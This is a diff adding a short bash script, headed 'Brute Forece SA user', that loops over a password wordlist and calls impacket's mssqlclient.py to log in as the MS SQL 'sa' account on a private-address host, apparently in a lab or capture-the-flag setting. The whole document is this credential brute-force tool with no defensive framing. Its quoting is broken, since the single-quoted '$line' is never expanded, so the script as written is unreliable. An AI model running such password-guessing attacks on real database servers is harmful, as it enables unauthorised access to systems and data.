@@ -1,0 +1,11 @@
+==============================================================================
+[+] Brute Forece SA user
+==============================================================================
+#!/bin/bash
+filename=$1
+while read line; do
+# reading each line
+echo $line
+python3 /usr/share/doc/python3-impacket/examples/mssqlclient.py -p 1433 sa:'$line'@192.168.40.114
+done < $filename
+                    
